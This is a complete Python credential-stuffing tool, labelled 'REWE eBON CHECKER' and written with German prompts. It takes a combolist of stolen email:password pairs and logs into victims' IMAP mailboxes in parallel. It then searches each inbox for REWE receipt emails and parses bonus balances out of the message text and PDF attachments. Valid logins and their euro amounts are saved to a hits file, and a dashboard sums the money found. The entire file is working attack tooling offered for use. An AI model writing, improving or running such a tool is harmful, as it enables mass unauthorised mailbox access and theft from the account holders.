import imaplib
import email
import re
import os
import io
import time
import queue
import threading
import sys
from email.header import decode_header
from email.utils import parseaddr
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = WHITE = MAGENTA = RESET = ''
    class Style:
        BRIGHT = RESET_ALL = ''

try:
    from pypdf import PdfReader
    PDF_OK = True
except ImportError:
    try:
        from PyPDF2 import PdfReader
        PDF_OK = True
    except ImportError:
        PDF_OK = False

TARGET_EMAIL = "ebon@mailing.rewe.de"

LOCK = threading.Lock()
STATE = {
    "checked": 0, "hits": 0, "bad_login": 0,
    "connect_err": 0, "no_ebon": 0, "money": 0.0,
    "total": 0, "start_time": time.time(),
}
RECENT_HITS = []  # letzte 8 Hits
WRITE_QUEUE = queue.Queue()
HITS_MEM = []
STOP_WRITER = threading.Event()
STOP_DASH = threading.Event()


# ============================================================
# WRITER THREAD
# ============================================================
def writer_thread():
    hits_f = open("hits.txt", "w", encoding="utf-8")
    noebon_f = open("no_ebon.txt", "w", encoding="utf-8")
    badlogin_f = open("bad_login.txt", "w", encoding="utf-8")
    try:
        while not STOP_WRITER.is_set() or not WRITE_QUEUE.empty():
            try:
                item = WRITE_QUEUE.get(timeout=0.3)
            except queue.Empty:
                continue
            kind, line = item
            try:
                if kind == "hit":
                    hits_f.write(line + "\n")
                    hits_f.flush()
                    try:
                        os.fsync(hits_f.fileno())
                    except Exception:
                        pass
                    HITS_MEM.append(line)
                elif kind == "noebon":
                    noebon_f.write(line + "\n")
                    noebon_f.flush()
                elif kind == "badlogin":
                    badlogin_f.write(line + "\n")
                    badlogin_f.flush()
            except Exception:
                pass
            finally:
                WRITE_QUEUE.task_done()
    finally:
        for f in (hits_f, noebon_f, badlogin_f):
            try:
                f.close()
            except Exception:
                pass


def queue_write(kind, line):
    WRITE_QUEUE.put((kind, line))


# ============================================================
# HELPERS
# ============================================================
def get_imap_server(e):
    try:
        d = e.split("@", 1)[1].lower()
    except Exception:
        return None
    fixed = {
        "web.de": "imap.web.de", "gmx.de": "imap.gmx.net",
        "gmx.net": "imap.gmx.net", "gmx.com": "imap.gmx.com",
        "t-online.de": "secureimap.t-online.de",
        "freenet.de": "mx.freenet.de", "mail.com": "imap.mail.com",
        "gmail.com": "imap.gmail.com", "googlemail.com": "imap.gmail.com",
        "yahoo.com": "imap.mail.yahoo.com", "yahoo.de": "imap.mail.yahoo.com",
        "aol.com": "imap.aol.com",
        "outlook.com": "outlook.office365.com", "outlook.de": "outlook.office365.com",
        "hotmail.com": "outlook.office365.com", "hotmail.de": "outlook.office365.com",
        "live.com": "outlook.office365.com", "live.de": "outlook.office365.com",
        "yandex.com": "imap.yandex.com", "yandex.ru": "imap.yandex.com",
        "mail.ru": "imap.mail.ru", "1und1.de": "imap.1und1.de",
        "ionos.de": "imap.ionos.de",
    }
    return fixed.get(d, "imap." + d)


def decode_str(s):
    try:
        parts = decode_header(s or "")
        out = ""
        for p, enc in parts:
            if isinstance(p, bytes):
                out += p.decode(enc or "utf-8", errors="ignore")
            else:
                out += p
        return out
    except Exception:
        return str(s or "")


def get_sender(msg):
    raw = msg.get("From", "") or ""
    try:
        raw = decode_str(raw)
    except Exception:
        pass
    name, addr = parseaddr(raw)
    return (addr or "").strip().lower()


def get_body_and_pdfs(msg):
    text = ""
    pdfs = []
    try:
        if msg.is_multipart():
            for part in msg.walk():
                ct = part.get_content_type()
                fn = part.get_filename()
                if ct in ("text/plain", "text/html"):
                    try:
                        text += part.get_payload(decode=True).decode("utf-8", errors="ignore") + "\n"
                    except Exception:
                        pass
                elif fn and fn.lower().endswith(".pdf"):
                    try:
                        pdfs.append(part.get_payload(decode=True))
                    except Exception:
                        pass
        else:
            try:
                text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
            except Exception:
                pass
    except Exception:
        pass
    return text, pdfs


def find_amount(text):
    if not text:
        return None
    t = text.replace("&nbsp;", " ")
    t = t.replace("&euro;", "EUR").replace("&#8364;", "EUR")
    t = t.replace("\u00a0", " ")
    t = re.sub(r"<[^>]+>", " ", t)
    t = re.sub(r"[ \t\r\n]+", " ", t)

    patterns = [
        r"Bonus[\s\-]?Guthaben[:\s]*(?:EUR)?\s*([0-9]{1,6}[.,][0-9]{2})",
        r"Bonusguthaben[:\s]*([0-9]{1,6}[.,][0-9]{2})",
        r"Aktuelles\s+Guthaben[:\s]*(?:EUR)?\s*([0-9]{1,6}[.,][0-9]{2})",
        r"Guthaben\s+betr(?:a|\u00e4)gt[:\s]*(?:EUR)?\s*([0-9]{1,6}[.,][0-9]{2})",
        r"Guthaben[:\s]+(?:EUR)?\s*([0-9]{1,6}[.,][0-9]{2})",
        r"(?:Neues|Rest|Verf(?:u|\u00fc)gbares)\s+Guthaben[:\s]*(?:EUR)?\s*([0-9]{1,6}[.,][0-9]{2})",
        r"EUR\s*([0-9]{1,6}[.,][0-9]{2})\s*(?:Bonus|Guthaben)",
        r"(?:SUMME|Gesamtbetrag|Zu\s+zahlen|Endbetrag)[:\s]*(?:EUR)?\s*([0-9]{1,6}[.,][0-9]{2})",
        r"([0-9]{1,3}[.,][0-9]{2})\s*EUR",
    ]
    for p in patterns:
        m = re.search(p, t, re.IGNORECASE)
        if m:
            try:
                v = float(m.group(1).replace(",", "."))
                if v > 0:
                    return v
            except ValueError:
                continue
    return None


def find_amount_pdf(data):
    if not PDF_OK:
        return None
    try:
        reader = PdfReader(io.BytesIO(data))
        full = ""
        for page in reader.pages[:5]:
            try:
                full += (page.extract_text() or "") + "\n"
            except Exception:
                continue
        return find_amount(full)
    except Exception:
        return None


def try_login(imap, e, p):
    user = e.split("@")[0]
    for u in (e, user):
        try:
            imap.login(u, p)
            return True
        except Exception:
            continue
    return False


def search_all_ebon_uids(imap):
    variants = [
        '(FROM "ebon@mailing.rewe.de")',
        '(FROM "mailing.rewe.de")',
        '(FROM "rewe.de")',
        '(FROM "rewe")',
        '(TEXT "ebon@mailing.rewe.de")',
        '(HEADER FROM "ebon")',
        '(HEADER FROM "rewe")',
    ]
    found = set()
    for v in variants:
        try:
            r, d = imap.uid("search", None, v)
            if r == "OK" and d and d[0]:
                for uid in d[0].split():
                    found.add(uid)
        except Exception:
            continue
    return list(found)


# ============================================================
# CHECK
# ============================================================
def check_account(e, p):
    server = get_imap_server(e)
    if not server:
        return e, False, None, "UNSUPPORTED"

    try:
        imap = imaplib.IMAP4_SSL(server, timeout=25)
    except Exception:
        return e, False, None, "CONNECT"

    if not try_login(imap, e, p):
        try:
            imap.logout()
        except Exception:
            pass
        return e, False, None, "BAD_LOGIN"

    try:
        st, _ = imap.select("inbox")
        if st != "OK":
            try:
                imap.logout()
            except Exception:
                pass
            return e, False, None, "SELECT_FAIL"

        uids = search_all_ebon_uids(imap)
        try:
            uids_sorted = sorted(uids, key=lambda x: int(x), reverse=True)
        except Exception:
            uids_sorted = list(reversed(uids))

        latest_amount = None
        found_ebon = False

        for uid in uids_sorted:
            try:
                typ, msg_data = imap.uid("fetch", uid, "(RFC822)")
                if typ != "OK" or not msg_data or not isinstance(msg_data[0], tuple):
                    continue
                msg = email.message_from_bytes(msg_data[0][1])
                sender = get_sender(msg)
                if sender != TARGET_EMAIL:
                    continue
                found_ebon = True
                subj = decode_str(msg.get("Subject", ""))
                body, pdfs = get_body_and_pdfs(msg)
                amt = find_amount(subj + " " + body)
                if amt is None and pdfs:
                    for pdf in pdfs:
                        amt = find_amount_pdf(pdf)
                        if amt is not None:
                            break
                if amt is not None and amt > 0:
                    latest_amount = amt
                    break
            except Exception:
                continue

        try:
            imap.logout()
        except Exception:
            pass

        if not found_ebon:
            return e, False, None, "NO_EBON"
        if latest_amount is None:
            return e, False, None, "NO_AMOUNT"

        return e, True, {"email": e, "password": p, "amount": latest_amount}, None

    except Exception:
        try:
            imap.logout()
        except Exception:
            pass
        return e, False, None, "ERR"


def worker(e, p):
    try:
        _em, hit, data, err = check_account(e, p)
    except Exception:
        with LOCK:
            STATE["checked"] += 1
            STATE["connect_err"] += 1
        return

    if hit and data:
        line = "%s:%s | REWE eBon | %.2f EUR" % (
            data["email"], data["password"], data["amount"])
        queue_write("hit", line)
        with LOCK:
            STATE["checked"] += 1
            STATE["hits"] += 1
            STATE["money"] += data["amount"]
            RECENT_HITS.append((data["email"], data["amount"]))
            if len(RECENT_HITS) > 8:
                RECENT_HITS.pop(0)
    else:
        with LOCK:
            STATE["checked"] += 1
            if err == "BAD_LOGIN":
                STATE["bad_login"] += 1
            elif err in ("NO_EBON", "NO_AMOUNT"):
                STATE["no_ebon"] += 1
            else:
                STATE["connect_err"] += 1

        if err == "BAD_LOGIN":
            queue_write("badlogin", "%s:%s" % (e, p))
        elif err in ("NO_EBON", "NO_AMOUNT"):
            queue_write("noebon", "%s:%s" % (e, p))


# ============================================================
# LIVE DASHBOARD
# ============================================================
def fmt_time(secs):
    secs = int(secs)
    m, s = divmod(secs, 60)
    h, m = divmod(m, 60)
    if h:
        return "%dh %dm %ds" % (h, m, s)
    return "%dm %ds" % (m, s)


def render_dashboard():
    with LOCK:
        s = dict(STATE)
        recent = list(RECENT_HITS)

    os.system("cls" if os.name == "nt" else "clear")

    # Header
    print()
    print("%s════════════════════════════════════════════════════════════%s" % (Fore.GREEN, Fore.RESET))
    print("%s              REWE eBON CHECKER — LIVE%s" % (Fore.GREEN, Fore.RESET))
    print("%s════════════════════════════════════════════════════════════%s" % (Fore.GREEN, Fore.RESET))
    print()

    # Progress
    total = s["total"] or 1
    pct = s["checked"] / total * 100
    bar_len = 40
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    print("  Progress [%s%s%s] %s%.1f%%%s" % (
        Fore.GREEN, bar, Fore.RESET, Fore.WHITE, pct, Fore.RESET))
    print("  %d / %d   Laufzeit: %s" % (s["checked"], s["total"], fmt_time(time.time() - s["start_time"])))
    print()

    # Stats
    print("%s────────────────────────────────────────────────────────────%s" % (Fore.CYAN, Fore.RESET))
    print("  %sHITS%s      : %s%-6d%s    %sMONEY%s  : %s%.2f EUR%s" % (
        Fore.GREEN, Fore.RESET, Fore.GREEN, s["hits"], Fore.RESET,
        Fore.GREEN, Fore.RESET, Fore.GREEN, s["money"], Fore.RESET))
    print("  %sBAD LOGIN%s : %s%-6d%s    %sNO eBON%s: %s%-6d%s" % (
        Fore.RED, Fore.RESET, Fore.RED, s["bad_login"], Fore.RESET,
        Fore.YELLOW, Fore.RESET, Fore.YELLOW, s["no_ebon"], Fore.RESET))
    print("  %sERRORS%s    : %s%-6d%s" % (
        Fore.YELLOW, Fore.RESET, Fore.YELLOW, s["connect_err"], Fore.RESET))
    print("%s────────────────────────────────────────────────────────────%s" % (Fore.CYAN, Fore.RESET))
    print()

    # Live Hits
    print("  %s◄ LIVE HITS ►%s" % (Fore.MAGENTA + Style.BRIGHT, Fore.RESET))
    print()
    if recent:
        for em, amt in recent:
            print("  %s[+]%s %-45s %s%.2f EUR%s" % (
                Fore.GREEN, Fore.RESET, em[:45], Fore.GREEN, amt, Fore.RESET))
    else:
        print("  %s(warten auf Hits...)%s" % (Fore.CYAN, Fore.RESET))
    print()
    print("%s════════════════════════════════════════════════════════════%s" % (
        Fore.GREEN, Fore.RESET))
    print("  %sCtrl+C zum Abbrechen%s" % (Fore.YELLOW, Fore.RESET))


def dashboard_loop():
    while not STOP_DASH.is_set():
        try:
            render_dashboard()
        except Exception:
            pass
        time.sleep(1)


# ============================================================
# MAIN
# ============================================================
def main():
    os.system("cls" if os.name == "nt" else "clear")

    print("=" * 70)
    print("      REWE eBON CHECKER")
    print("=" * 70)
    print()
    if not PDF_OK:
        print("[!] pypdf fehlt — PDFs werden ignoriert")
        print("    pip install pypdf")
        print()

    fn = input("[x] Combolist Datei: ").strip()
    if not os.path.exists(fn):
        print("[!] Datei nicht gefunden:", fn)
        return

    with open(fn, "r", encoding="utf-8", errors="ignore") as f:
        raw = [l.strip() for l in f if ":" in l]

    accs = []
    for l in raw:
        pp = l.split(":", 1)
        if len(pp) == 2:
            accs.append((pp[0].strip(), pp[1].strip()))

    if not accs:
        print("[!] Keine Accounts")
        return

    print("[x] Accounts: %d" % len(accs))

    try:
        ti = input("[x] Threads (default 50): ").strip()
        th = int(ti) if ti else 50
        if th < 1:
            th = 50
    except ValueError:
        th = 50

    with LOCK:
        STATE["total"] = len(accs)
        STATE["start_time"] = time.time()

    # Writer-Thread
    wt = threading.Thread(target=writer_thread, daemon=False)
    wt.start()

    # Dashboard-Thread
    dt = threading.Thread(target=dashboard_loop, daemon=True)
    dt.start()

    try:
        with ThreadPoolExecutor(max_workers=th) as ex:
            futs = [ex.submit(worker, e, p) for e, p in accs]
            for _ in as_completed(futs):
                pass
    except KeyboardInterrupt:
        print("\n[!] Abbruch durch User")

    WRITE_QUEUE.join()
    STOP_WRITER.set()
    wt.join(timeout=5)
    STOP_DASH.set()

    # Final-Status
    with LOCK:
        s = dict(STATE)

    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("%s════════════════════════════════════════════════════════════%s" % (Fore.GREEN, Fore.RESET))
    print("%s                   FERTIG — SUMMARY%s" % (Fore.GREEN, Fore.RESET))
    print("%s════════════════════════════════════════════════════════════%s" % (Fore.GREEN, Fore.RESET))
    print()
    print("  Geprüft        : %d" % s["checked"])
    print("  %sHITS%s           : %s%d%s" % (Fore.GREEN, Fore.RESET, Fore.GREEN, s["hits"], Fore.RESET))
    print("  %sBad Login%s      : %s%d%s" % (Fore.RED, Fore.RESET, Fore.RED, s["bad_login"], Fore.RESET))
    print("  %sNo eBon%s        : %s%d%s" % (Fore.YELLOW, Fore.RESET, Fore.YELLOW, s["no_ebon"], Fore.RESET))
    print("  %sConnect Err%s    : %s%d%s" % (Fore.YELLOW, Fore.RESET, Fore.YELLOW, s["connect_err"], Fore.RESET))
    print()
    print("  %sGESAMT-GUTHABEN: %.2f EUR%s" % (Fore.GREEN, s["money"], Fore.RESET))
    print()
    print("  %shits.txt%s        — %semail:pass | REWE eBon | XX.XX EUR%s" % (Fore.CYAN, Fore.RESET, Fore.WHITE, Fore.RESET))
    print("  %sno_ebon.txt%s     — Login OK, kein eBon" % (Fore.CYAN, Fore.RESET))
    print("  %sbad_login.txt%s   — Login fehlgeschlagen" % (Fore.CYAN, Fore.RESET))
    print()
    input("Enter zum Beenden...")


if __name__ == "__main__":
    main()